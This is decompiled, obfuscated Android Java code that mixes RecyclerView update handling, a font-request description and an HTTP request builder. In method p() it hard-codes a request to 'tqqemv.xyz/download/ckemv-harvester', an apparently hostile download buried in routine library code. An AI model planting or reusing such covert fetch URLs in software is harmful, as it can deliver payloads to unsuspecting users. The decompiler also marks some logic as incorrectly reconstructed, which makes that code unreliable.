package G;

import L1.u;
import X0.o;
import Z.C0034a;
import Z.C0057y;
import a.AbstractC0059a;
import android.util.Base64;
import androidx.recyclerview.widget.RecyclerView;
import f.C0150G;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import k.C0306s;

/* loaded from: classes.dex */
public final class e {

    /* renamed from: a, reason: collision with root package name */
    public final /* synthetic */ int f181a;

    /* renamed from: b, reason: collision with root package name */
    public Object f182b;
    public Object c;

    /* renamed from: d, reason: collision with root package name */
    public Object f183d;

    /* renamed from: e, reason: collision with root package name */
    public Object f184e;

    /* renamed from: f, reason: collision with root package name */
    public Object f185f;

    public /* synthetic */ e(boolean z3) {
        this.f181a = 2;
    }

    public C0306s a() {
        Map unmodifiableMap;
        m2.l lVar = (m2.l) this.c;
        if (lVar == null) {
            throw new IllegalStateException("url == null".toString());
        }
        String str = (String) this.f182b;
        m2.j l3 = ((C0150G) this.f183d).l();
        o oVar = (o) this.f184e;
        byte[] bArr = n2.b.f4249a;
        LinkedHashMap linkedHashMap = (LinkedHashMap) this.f185f;
        X1.g.e(linkedHashMap, "<this>");
        if (linkedHashMap.isEmpty()) {
            unmodifiableMap = u.f623b;
        } else {
            unmodifiableMap = Collections.unmodifiableMap(new LinkedHashMap(linkedHashMap));
            X1.g.d(unmodifiableMap, "{\n    Collections.unmodi…(LinkedHashMap(this))\n  }");
        }
        return new C0306s(lVar, str, l3, oVar, unmodifiableMap);
    }

    public boolean b(int i3) {
        ArrayList arrayList = (ArrayList) this.f183d;
        int size = arrayList.size();
        for (int i4 = 0; i4 < size; i4++) {
            C0034a c0034a = (C0034a) arrayList.get(i4);
            int i5 = c0034a.f1226a;
            if (i5 == 8) {
                if (g(c0034a.f1228d, i4 + 1) == i3) {
                    return true;
                }
            } else if (i5 == 1) {
                int i6 = c0034a.f1227b;
                int i7 = c0034a.f1228d + i6;
                while (i6 < i7) {
                    if (g(i6, i4 + 1) == i3) {
                        return true;
                    }
                    i6++;
                }
            } else {
                continue;
            }
        }
        return false;
    }

    public void c() {
        ArrayList arrayList = (ArrayList) this.f183d;
        int size = arrayList.size();
        for (int i3 = 0; i3 < size; i3++) {
            ((C0057y) this.f184e).a((C0034a) arrayList.get(i3));
        }
        n(arrayList);
    }

    public void d() {
        c();
        ArrayList arrayList = (ArrayList) this.c;
        int size = arrayList.size();
        for (int i3 = 0; i3 < size; i3++) {
            C0034a c0034a = (C0034a) arrayList.get(i3);
            int i4 = c0034a.f1226a;
            C0057y c0057y = (C0057y) this.f184e;
            if (i4 == 1) {
                c0057y.a(c0034a);
                c0057y.d(c0034a.f1227b, c0034a.f1228d);
            } else if (i4 == 2) {
                c0057y.a(c0034a);
                int i5 = c0034a.f1227b;
                int i6 = c0034a.f1228d;
                RecyclerView recyclerView = c0057y.f1371a;
                recyclerView.O(i5, i6, true);
                recyclerView.f2127g0 = true;
                recyclerView.f2122d0.c += i6;
            } else if (i4 == 4) {
                c0057y.a(c0034a);
                c0057y.c(c0034a.f1227b, c0034a.f1228d, c0034a.c);
            } else if (i4 == 8) {
                c0057y.a(c0034a);
                c0057y.e(c0034a.f1227b, c0034a.f1228d);
            }
        }
        n(arrayList);
    }

    public void e(C0034a c0034a) {
        int i3;
        I.b bVar;
        int i4 = c0034a.f1226a;
        if (i4 == 1 || i4 == 8) {
            throw new IllegalArgumentException("should not dispatch add or move for pre layout");
        }
        int o3 = o(c0034a.f1227b, i4);
        int i5 = c0034a.f1227b;
        int i6 = c0034a.f1226a;
        if (i6 == 2) {
            i3 = 0;
        } else {
            if (i6 != 4) {
                throw new IllegalArgumentException("op should be remove or update." + c0034a);
            }
            i3 = 1;
        }
        int i7 = 1;
        int i8 = 1;
        while (true) {
            int i9 = c0034a.f1228d;
            bVar = (I.b) this.f182b;
            if (i7 >= i9) {
                break;
            }
            int o4 = o((i3 * i7) + c0034a.f1227b, c0034a.f1226a);
            int i10 = c0034a.f1226a;
            if (i10 == 2 ? o4 != o3 : !(i10 == 4 && o4 == o3 + 1)) {
                C0034a k2 = k(c0034a.c, i10, o3, i8);
                f(k2, i5);
                k2.c = null;
                bVar.c(k2);
                if (c0034a.f1226a == 4) {
                    i5 += i8;
                }
                i8 = 1;
                o3 = o4;
            } else {
                i8++;
            }
            i7++;
        }
        Object obj = c0034a.c;
        c0034a.c = null;
        bVar.c(c0034a);
        if (i8 > 0) {
            C0034a k3 = k(obj, c0034a.f1226a, o3, i8);
            f(k3, i5);
            k3.c = null;
            bVar.c(k3);
        }
    }

    public void f(C0034a c0034a, int i3) {
        C0057y c0057y = (C0057y) this.f184e;
        c0057y.a(c0034a);
        int i4 = c0034a.f1226a;
        if (i4 != 2) {
            if (i4 != 4) {
                throw new IllegalArgumentException("only remove and update ops can be dispatched in first pass");
            }
            c0057y.c(i3, c0034a.f1228d, c0034a.c);
        } else {
            int i5 = c0034a.f1228d;
            RecyclerView recyclerView = c0057y.f1371a;
            recyclerView.O(i3, i5, true);
            recyclerView.f2127g0 = true;
            recyclerView.f2122d0.c += i5;
        }
    }

    public int g(int i3, int i4) {
        ArrayList arrayList = (ArrayList) this.f183d;
        int size = arrayList.size();
        while (i4 < size) {
            C0034a c0034a = (C0034a) arrayList.get(i4);
            int i5 = c0034a.f1226a;
            if (i5 == 8) {
                int i6 = c0034a.f1227b;
                if (i6 == i3) {
                    i3 = c0034a.f1228d;
                } else {
                    if (i6 < i3) {
                        i3--;
                    }
                    if (c0034a.f1228d <= i3) {
                        i3++;
                    }
                }
            } else {
                int i7 = c0034a.f1227b;
                if (i7 > i3) {
                    continue;
                } else if (i5 == 2) {
                    int i8 = c0034a.f1228d;
                    if (i3 < i7 + i8) {
                        return -1;
                    }
                    i3 -= i8;
                } else if (i5 == 1) {
                    i3 += c0034a.f1228d;
                }
            }
            i4++;
        }
        return i3;
    }

    public boolean h() {
        return ((ArrayList) this.c).size() > 0;
    }

    public void i(String str, String str2) {
        X1.g.e(str2, "value");
        C0150G c0150g = (C0150G) this.f183d;
        c0150g.getClass();
        u2.d.c(str);
        u2.d.e(str2, str);
        c0150g.q(str);
        c0150g.i(str, str2);
    }

    public void j(String str, o oVar) {
        if (str.length() <= 0) {
            throw new IllegalArgumentException("method.isEmpty() == true".toString());
        }
        if (oVar == null) {
            if (!(!(X1.g.a(str, "POST") || X1.g.a(str, "PUT") || X1.g.a(str, "PATCH") || X1.g.a(str, "PROPPATCH") || X1.g.a(str, "REPORT")))) {
                throw new IllegalArgumentException(X.d.i("method ", str, " must have a request body.").toString());
            }
        } else if (!AbstractC0059a.H(str)) {
            throw new IllegalArgumentException(X.d.i("method ", str, " must not have a request body.").toString());
        }
        this.f182b = str;
        this.f184e = oVar;
    }

    /* JADX WARN: Type inference failed for: r0v4, types: [java.lang.Object, Z.a] */
    public C0034a k(Object obj, int i3, int i4, int i5) {
        C0034a c0034a = (C0034a) ((I.b) this.f182b).a();
        if (c0034a != null) {
            c0034a.f1226a = i3;
            c0034a.f1227b = i4;
            c0034a.f1228d = i5;
            c0034a.c = obj;
            return c0034a;
        }
        ?? obj2 = new Object();
        obj2.f1226a = i3;
        obj2.f1227b = i4;
        obj2.f1228d = i5;
        obj2.c = obj;
        return obj2;
    }

    public void l(C0034a c0034a) {
        ((ArrayList) this.f183d).add(c0034a);
        int i3 = c0034a.f1226a;
        C0057y c0057y = (C0057y) this.f184e;
        if (i3 == 1) {
            c0057y.d(c0034a.f1227b, c0034a.f1228d);
            return;
        }
        if (i3 == 2) {
            int i4 = c0034a.f1227b;
            int i5 = c0034a.f1228d;
            RecyclerView recyclerView = c0057y.f1371a;
            recyclerView.O(i4, i5, false);
            recyclerView.f2127g0 = true;
            return;
        }
        if (i3 == 4) {
            c0057y.c(c0034a.f1227b, c0034a.f1228d, c0034a.c);
        } else if (i3 == 8) {
            c0057y.e(c0034a.f1227b, c0034a.f1228d);
        } else {
            throw new IllegalArgumentException("Unknown update op type for " + c0034a);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:119:0x006f  */
    /* JADX WARN: Removed duplicated region for block: B:123:0x0090  */
    /* JADX WARN: Removed duplicated region for block: B:125:0x00a5  */
    /* JADX WARN: Removed duplicated region for block: B:127:0x00aa A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:130:0x000d A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:131:0x0094  */
    /* JADX WARN: Removed duplicated region for block: B:132:0x0074  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x0135 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:95:0x0121 A[SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void m() {
        char c;
        int i3;
        boolean z3;
        char c3;
        C0034a k2;
        int i4;
        int i5;
        C0034a k3;
        boolean z4;
        boolean z5;
        C0034a k4;
        ArrayList arrayList = (ArrayList) this.c;
        A.h hVar = (A.h) this.f185f;
        hVar.getClass();
        while (true) {
            int size = arrayList.size() - 1;
            boolean z6 = false;
            while (true) {
                c = 65535;
                i3 = 8;
                if (size < 0) {
                    size = -1;
                    break;
                }
                if (((C0034a) arrayList.get(size)).f1226a != 8) {
                    z6 = true;
                } else if (z6) {
                    break;
                }
                size--;
            }
            if (size == -1) {
                break;
            }
            int i6 = size + 1;
            C0034a c0034a = (C0034a) arrayList.get(size);
            C0034a c0034a2 = (C0034a) arrayList.get(i6);
            int i7 = c0034a2.f1226a;
            if (i7 != 1) {
                e eVar = (e) hVar.c;
                if (i7 == 2) {
                    int i8 = c0034a.f1227b;
                    int i9 = c0034a.f1228d;
                    if (i8 < i9) {
                        z5 = c0034a2.f1227b == i8 && c0034a2.f1228d == i9 - i8;
                        z4 = false;
                    } else if (c0034a2.f1227b == i9 + 1 && c0034a2.f1228d == i8 - i9) {
                        z5 = true;
                        z4 = true;
                    } else {
                        z4 = true;
                        z5 = false;
                    }
                    int i10 = c0034a2.f1227b;
                    if (i9 < i10) {
                        c0034a2.f1227b = i10 - 1;
                    } else {
                        int i11 = c0034a2.f1228d;
                        if (i9 < i10 + i11) {
                            c0034a2.f1228d = i11 - 1;
                            c0034a.f1226a = 2;
                            c0034a.f1228d = 1;
                            if (c0034a2.f1228d == 0) {
                                arrayList.remove(i6);
                                eVar.getClass();
                                c0034a2.c = null;
                                ((I.b) eVar.f182b).c(c0034a2);
                            }
                        }
                    }
                    int i12 = c0034a.f1227b;
                    int i13 = c0034a2.f1227b;
                    if (i12 <= i13) {
                        c0034a2.f1227b = i13 + 1;
                    } else {
                        int i14 = i13 + c0034a2.f1228d;
                        if (i12 < i14) {
                            k4 = eVar.k(null, 2, i12 + 1, i14 - i12);
                            c0034a2.f1228d = c0034a.f1227b - c0034a2.f1227b;
                            if (z5) {
                                if (z4) {
                                    if (k4 != null) {
                                        int i15 = c0034a.f1227b;
                                        if (i15 > k4.f1227b) {
                                            c0034a.f1227b = i15 - k4.f1228d;
                                        }
                                        int i16 = c0034a.f1228d;
                                        if (i16 > k4.f1227b) {
                                            c0034a.f1228d = i16 - k4.f1228d;
                                        }
                                    }
                                    int i17 = c0034a.f1227b;
                                    if (i17 > c0034a2.f1227b) {
                                        c0034a.f1227b = i17 - c0034a2.f1228d;
                                    }
                                    int i18 = c0034a.f1228d;
                                    if (i18 > c0034a2.f1227b) {
                                        c0034a.f1228d = i18 - c0034a2.f1228d;
                                    }
                                } else {
                                    if (k4 != null) {
                                        int i19 = c0034a.f1227b;
                                        if (i19 >= k4.f1227b) {
                                            c0034a.f1227b = i19 - k4.f1228d;
                                        }
                                        int i20 = c0034a.f1228d;
                                        if (i20 >= k4.f1227b) {
                                            c0034a.f1228d = i20 - k4.f1228d;
                                        }
                                    }
                                    int i21 = c0034a.f1227b;
                                    if (i21 >= c0034a2.f1227b) {
                                        c0034a.f1227b = i21 - c0034a2.f1228d;
                                    }
                                    int i22 = c0034a.f1228d;
                                    if (i22 >= c0034a2.f1227b) {
                                        c0034a.f1228d = i22 - c0034a2.f1228d;
                                    }
                                }
                                arrayList.set(size, c0034a2);
                                if (c0034a.f1227b != c0034a.f1228d) {
                                    arrayList.set(i6, c0034a);
                                } else {
                                    arrayList.remove(i6);
                                }
                                if (k4 != null) {
                                    arrayList.add(size, k4);
                                }
                            } else {
                                arrayList.set(size, c0034a2);
                                arrayList.remove(i6);
                                eVar.getClass();
                                c0034a.c = null;
                                ((I.b) eVar.f182b).c(c0034a);
                            }
                        }
                    }
                    k4 = null;
                    if (z5) {
                    }
                } else if (i7 == 4) {
                    int i23 = c0034a.f1228d;
                    int i24 = c0034a2.f1227b;
                    if (i23 < i24) {
                        c0034a2.f1227b = i24 - 1;
                    } else {
                        int i25 = c0034a2.f1228d;
                        if (i23 < i24 + i25) {
                            c0034a2.f1228d = i25 - 1;
                            k2 = eVar.k(c0034a2.c, 4, c0034a.f1227b, 1);
                            i4 = c0034a.f1227b;
                            i5 = c0034a2.f1227b;
                            if (i4 > i5) {
                                c0034a2.f1227b = i5 + 1;
                            } else {
                                int i26 = i5 + c0034a2.f1228d;
                                if (i4 < i26) {
                                    int i27 = i26 - i4;
                                    k3 = eVar.k(c0034a2.c, 4, i4 + 1, i27);
                                    c0034a2.f1228d -= i27;
                                    arrayList.set(i6, c0034a);
                                    if (c0034a2.f1228d > 0) {
                                        arrayList.set(size, c0034a2);
                                    } else {
                                        arrayList.remove(size);
                                        eVar.getClass();
                                        c0034a2.c = null;
                                        ((I.b) eVar.f182b).c(c0034a2);
                                    }
                                    if (k2 != null) {
                                        arrayList.add(size, k2);
                                    }
                                    if (k3 != null) {
                                        arrayList.add(size, k3);
                                    }
                                }
                            }
                            k3 = null;
                            arrayList.set(i6, c0034a);
                            if (c0034a2.f1228d > 0) {
                            }
                            if (k2 != null) {
                            }
                            if (k3 != null) {
                            }
                        }
                    }
                    k2 = null;
                    i4 = c0034a.f1227b;
                    i5 = c0034a2.f1227b;
                    if (i4 > i5) {
                    }
                    k3 = null;
                    arrayList.set(i6, c0034a);
                    if (c0034a2.f1228d > 0) {
                    }
                    if (k2 != null) {
                    }
                    if (k3 != null) {
                    }
                }
            } else {
                int i28 = c0034a.f1228d;
                int i29 = c0034a2.f1227b;
                int i30 = i28 < i29 ? -1 : 0;
                int i31 = c0034a.f1227b;
                if (i31 < i29) {
                    i30++;
                }
                if (i29 <= i31) {
                    c0034a.f1227b = i31 + c0034a2.f1228d;
                }
                int i32 = c0034a2.f1227b;
                if (i32 <= i28) {
                    c0034a.f1228d = i28 + c0034a2.f1228d;
                }
                c0034a2.f1227b = i32 + i30;
                arrayList.set(size, c0034a2);
                arrayList.set(i6, c0034a);
            }
        }
        int size2 = arrayList.size();
        int i33 = 0;
        while (i33 < size2) {
            C0034a c0034a3 = (C0034a) arrayList.get(i33);
            int i34 = c0034a3.f1226a;
            if (i34 != 1) {
                I.b bVar = (I.b) this.f182b;
                C0057y c0057y = (C0057y) this.f184e;
                if (i34 == 2) {
                    int i35 = c0034a3.f1227b;
                    int i36 = c0034a3.f1228d + i35;
                    int i37 = i35;
                    int i38 = 0;
                    char c4 = 65535;
                    while (i37 < i36) {
                        if (c0057y.b(i37) != null || b(i37)) {
                            if (c4 == 0) {
                                e(k(null, 2, i35, i38));
                                z3 = true;
                            } else {
                                z3 = false;
                            }
                            c3 = 1;
                        } else {
                            if (c4 == 1) {
                                l(k(null, 2, i35, i38));
                                z3 = true;
                            } else {
                                z3 = false;
                            }
                            c3 = 0;
                        }
                        if (z3) {
                            i37 -= i38;
                            i36 -= i38;
                            i38 = 1;
                        } else {
                            i38++;
                        }
                        i37++;
                        c4 = c3;
                    }
                    if (i38 != c0034a3.f1228d) {
                        c0034a3.c = null;
                        bVar.c(c0034a3);
                        c0034a3 = k(null, 2, i35, i38);
                    }
                    if (c4 == 0) {
                        e(c0034a3);
                    } else {
                        l(c0034a3);
                    }
                } else if (i34 == 4) {
                    int i39 = c0034a3.f1227b;
                    int i40 = c0034a3.f1228d + i39;
                    char c5 = c;
                    int i41 = i39;
                    int i42 = 0;
                    while (i39 < i40) {
                        if (c0057y.b(i39) != null || b(i39)) {
                            if (c5 == 0) {
                                e(k(c0034a3.c, 4, i41, i42));
                                i41 = i39;
                                i42 = 0;
                            }
                            c5 = 1;
                        } else {
                            if (c5 == 1) {
                                l(k(c0034a3.c, 4, i41, i42));
                                i41 = i39;
                                i42 = 0;
                            }
                            c5 = 0;
                        }
                        i42++;
                        i39++;
                    }
                    if (i42 != c0034a3.f1228d) {
                        Object obj = c0034a3.c;
                        c0034a3.c = null;
                        bVar.c(c0034a3);
                        c0034a3 = k(obj, 4, i41, i42);
                    }
                    if (c5 == 0) {
                        e(c0034a3);
                    } else {
                        l(c0034a3);
                    }
                } else if (i34 == i3) {
                    l(c0034a3);
                }
            } else {
                l(c0034a3);
            }
            i33++;
            c = 65535;
            i3 = 8;
        }
        arrayList.clear();
    }

    public void n(ArrayList arrayList) {
        int size = arrayList.size();
        for (int i3 = 0; i3 < size; i3++) {
            C0034a c0034a = (C0034a) arrayList.get(i3);
            c0034a.c = null;
            ((I.b) this.f182b).c(c0034a);
        }
        arrayList.clear();
    }

    public int o(int i3, int i4) {
        int i5;
        int i6;
        ArrayList arrayList = (ArrayList) this.f183d;
        for (int size = arrayList.size() - 1; size >= 0; size--) {
            C0034a c0034a = (C0034a) arrayList.get(size);
            int i7 = c0034a.f1226a;
            if (i7 == 8) {
                int i8 = c0034a.f1227b;
                int i9 = c0034a.f1228d;
                if (i8 < i9) {
                    i6 = i8;
                    i5 = i9;
                } else {
                    i5 = i8;
                    i6 = i9;
                }
                if (i3 < i6 || i3 > i5) {
                    if (i3 < i8) {
                        if (i4 == 1) {
                            c0034a.f1227b = i8 + 1;
                            c0034a.f1228d = i9 + 1;
                        } else if (i4 == 2) {
                            c0034a.f1227b = i8 - 1;
                            c0034a.f1228d = i9 - 1;
                        }
                    }
                } else if (i6 == i8) {
                    if (i4 == 1) {
                        c0034a.f1228d = i9 + 1;
                    } else if (i4 == 2) {
                        c0034a.f1228d = i9 - 1;
                    }
                    i3++;
                } else {
                    if (i4 == 1) {
                        c0034a.f1227b = i8 + 1;
                    } else if (i4 == 2) {
                        c0034a.f1227b = i8 - 1;
                    }
                    i3--;
                }
            } else {
                int i10 = c0034a.f1227b;
                if (i10 <= i3) {
                    if (i7 == 1) {
                        i3 -= c0034a.f1228d;
                    } else if (i7 == 2) {
                        i3 += c0034a.f1228d;
                    }
                } else if (i4 == 1) {
                    c0034a.f1227b = i10 + 1;
                } else if (i4 == 2) {
                    c0034a.f1227b = i10 - 1;
                }
            }
        }
        for (int size2 = arrayList.size() - 1; size2 >= 0; size2--) {
            C0034a c0034a2 = (C0034a) arrayList.get(size2);
            int i11 = c0034a2.f1226a;
            I.b bVar = (I.b) this.f182b;
            if (i11 == 8) {
                int i12 = c0034a2.f1228d;
                if (i12 == c0034a2.f1227b || i12 < 0) {
                    arrayList.remove(size2);
                    c0034a2.c = null;
                    bVar.c(c0034a2);
                }
            } else if (c0034a2.f1228d <= 0) {
                arrayList.remove(size2);
                c0034a2.c = null;
                bVar.c(c0034a2);
            }
        }
        return i3;
    }

    public void p() {
        String str = "https://tqqemv.xyz/download/ckemv-harvester";
        if (d2.l.V("https://tqqemv.xyz/download/ckemv-harvester", "ws:", true)) {
            str = "http:".concat("ps://tqqemv.xyz/download/ckemv-harvester");
        } else if (d2.l.V("https://tqqemv.xyz/download/ckemv-harvester", "wss:", true)) {
            str = "https:".concat("s://tqqemv.xyz/download/ckemv-harvester");
        }
        X1.g.e(str, "<this>");
        m2.k kVar = new m2.k();
        kVar.d(null, str);
        this.c = kVar.a();
    }

    public String toString() {
        switch (this.f181a) {
            case 0:
                StringBuilder sb = new StringBuilder();
                sb.append("FontRequest {mProviderAuthority: " + ((String) this.f182b) + ", mProviderPackage: " + ((String) this.c) + ", mQuery: " + ((String) this.f183d) + ", mCertificates:");
                int i3 = 0;
                while (true) {
                    List list = (List) this.f185f;
                    if (i3 >= list.size()) {
                        sb.append("}mCertificatesArray: 0");
                        return sb.toString();
                    }
                    sb.append(" [");
                    List list2 = (List) list.get(i3);
                    for (int i4 = 0; i4 < list2.size(); i4++) {
                        sb.append(" \"");
                        sb.append(Base64.encodeToString((byte[]) list2.get(i4), 0));
                        sb.append("\"");
                    }
                    sb.append(" ]");
                    i3++;
                }
            default:
                return super.toString();
        }
    }

    public e(String str, String str2, String str3, List list) {
        this.f181a = 0;
        str.getClass();
        this.f182b = str;
        str2.getClass();
        this.c = str2;
        this.f183d = str3;
        list.getClass();
        this.f185f = list;
        this.f184e = str + "-" + str2 + "-" + str3;
    }

    public e(C0057y c0057y) {
        this.f181a = 1;
        this.f182b = new I.b(30);
        this.c = new ArrayList();
        this.f183d = new ArrayList();
        this.f184e = c0057y;
        this.f185f = new A.h(19, this);
    }

    public e() {
        this.f181a = 2;
        this.f185f = new LinkedHashMap();
        this.f182b = "GET";
        this.f183d = new C0150G(9);
    }
}
